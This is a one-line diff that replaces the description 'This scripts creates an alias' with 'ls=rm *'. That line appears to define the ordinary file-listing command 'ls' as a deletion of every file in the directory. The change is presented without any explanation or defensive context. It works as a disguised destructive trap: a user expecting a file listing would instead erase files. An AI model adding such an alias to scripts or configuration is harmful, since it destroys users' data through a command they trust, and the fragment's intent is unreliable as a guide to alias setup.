@@ -1,1 +1,1 @@
-This scripts creates an alias
+ls=rm *
